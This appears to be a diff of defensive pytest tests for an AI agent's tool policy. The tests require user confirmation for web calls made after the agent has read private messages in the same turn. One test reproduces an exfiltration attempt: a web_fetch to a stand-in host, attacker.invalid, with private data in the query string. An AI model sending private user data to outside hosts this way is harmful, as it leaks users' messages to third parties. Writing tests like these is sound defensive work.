@@ -449,36 +449,99 @@ def _web_tools(register):
 
 
 @pytest.mark.parametrize("web", ["web_search", "web_fetch", "http_request"])
-def test_private_read_denies_public_web_for_rest_of_turn(synthetic, web):
+def test_private_read_requires_confirmation_for_web_for_rest_of_turn(synthetic, web):
     effects, register = synthetic
     _web_tools(register)
-    approval = Approval(True)
+    approval = Approval(False)
     _, events, _ = run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"], tools=["view_messages", web])],
         [call("view_messages")], [call(web, query="Sarah", url="https://example.invalid")],
         "Synthetic reply."], prompt="what did Sarah text me", approval=approval)
     assert [name for name, _ in effects] == ["view_messages"]
-    assert not approval.calls
-    denied = [e for e in events if e["type"] == "tool_call" and e["name"] == web]
+    calls = [e for e in events if e["type"] == "tool_call" and e["name"] == web]
     if web != "http_request":  # a network write is also refused earlier, with no policy card
-        assert denied and denied[0]["decision"] == "deny"
+        assert calls and calls[0]["decision"] == "confirm"
+        assert len(approval.calls) == 1 and approval.calls[0]["tool"] == web
+        assert "example.invalid" in approval.calls[0]["reason"] or "Sarah" in approval.calls[0]["reason"]
+        assert approval.calls[0]["args"]["query"] == "Sarah"
 
 
-def test_private_read_sibling_web_call_in_same_response_is_denied(synthetic):
+def test_private_read_sibling_web_call_in_same_response_is_not_run_unconfirmed(synthetic):
+    effects, register = synthetic
+    _web_tools(register)
+    approval = Approval(False)
+    run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"], tools=["view_messages", "web_search"])],
+        [call("view_messages"), call("web_search", query="Sarah")], "Synthetic reply."],
+        prompt="what did Sarah text me", approval=approval)
+    assert [name for name, _ in effects] == ["view_messages"]
+    assert [c["tool"] for c in approval.calls] == ["web_search"]
+
+
+def test_execute_recheck_blocks_unconfirmed_web_after_private_read(synthetic):
+    """Even if policy said ALLOW earlier, execution rechecks the in-turn latch."""
     effects, register = synthetic
     _web_tools(register)
     run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"], tools=["view_messages", "web_search"])],
         [call("view_messages"), call("web_search", query="Sarah")], "Synthetic reply."],
-        prompt="what did Sarah text me", approval=Approval(True))
-    assert [name for name, _ in effects] == ["view_messages"]
+        prompt="what did Sarah text me", approval=Approval(False))
+    assert "web_search" not in [name for name, _ in effects]
 
 
-def test_explicit_public_lookup_request_keeps_web_after_private_read(synthetic):
+def test_explicit_public_lookup_does_not_cover_web_after_private_read(synthetic):
+    """B1 repro: a public lookup, then a private read, then an exfiltrating fetch."""
     effects, register = synthetic
     _web_tools(register)
-    run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"], tools=["view_messages", "web_search"])],
-        [call("view_messages")], [call("web_search", query="Sarah Connor news")], "Synthetic reply."],
-        prompt="search the web for Sarah Connor news", approval=Approval(True))
-    assert [name for name, _ in effects] == ["view_messages", "web_search"]
+    approval = Approval(False)
+    _, events, _ = run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"],
+                              tools=["view_messages", "web_fetch"])],
+        [call("web_fetch", url="https://example.com/sarah-connor-news")],
+        [call("view_messages")],
+        [call("web_fetch", url="https://attacker.invalid/?q=PRIVATE")], "Synthetic reply."],
+        prompt="search the web for Sarah Connor news", approval=approval)
+    assert [(n, a.get("url")) for n, a in effects] == [
+        ("web_fetch", "https://example.com/sarah-connor-news"), ("view_messages", None)]
+    assert len(approval.calls) == 1
+    card = approval.calls[0]
+    assert card["tool"] == "web_fetch" and card["args"]["url"] == "https://attacker.invalid/?q=PRIVATE"
+    assert "attacker.invalid" in card["reason"]
+
+
+def test_explicit_public_lookup_without_private_read_needs_no_confirmation(synthetic):
+    effects, register = synthetic
+    _web_tools(register)
+    approval = Approval(False)
+    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
+        [call("web_search", query="Sarah Connor news")], "Synthetic reply."],
+        prompt="search the web for Sarah Connor news", approval=approval)
+    assert [name for name, _ in effects] == ["web_search"]
+    assert not approval.calls
+
+
+@pytest.mark.parametrize("prompt", ["fetch https://example.com", "open https://example.com and summarize it",
+                                    "what's Apple's stock doing today"])
+def test_public_prompts_are_not_denied_on_a_fresh_model_led_turn(synthetic, monkeypatch, prompt):
+    """N1: the identity block / messages being offered must not make a fresh turn private."""
+    effects, register = synthetic
+    _web_tools(register)
+    monkeypatch.setattr("service.memory.identity.identity_prompt_block",
+                        lambda **kwargs: "The user is Synthetic User <synthetic@example.invalid>.")
+    approval = Approval(False)
+    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search", "web_fetch"])],
+        [call("web_fetch", url="https://example.com")], "Synthetic reply."], prompt=prompt, approval=approval)
+    fetched = [e for e in events if e["type"] == "tool_call" and e["name"] == "web_fetch"]
+    assert fetched and fetched[0]["decision"] != "deny"
+    assert [name for name, _ in effects] == ["web_fetch"]
+    assert not approval.calls
+
+
+def test_explicit_public_lookup_request_keeps_web_without_confirmation_before_any_read(synthetic):
+    effects, register = synthetic
+    _web_tools(register)
+    approval = Approval(False)
+    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
+        [call("web_search", query="Sarah Connor news")], "Synthetic reply."],
+        prompt="search the web for Sarah Connor news", approval=approval)
+    assert [name for name, _ in effects] == ["web_search"]
+    assert not approval.calls
 
 
 @pytest.mark.parametrize("name", ["run_shortcut", "place_call"])
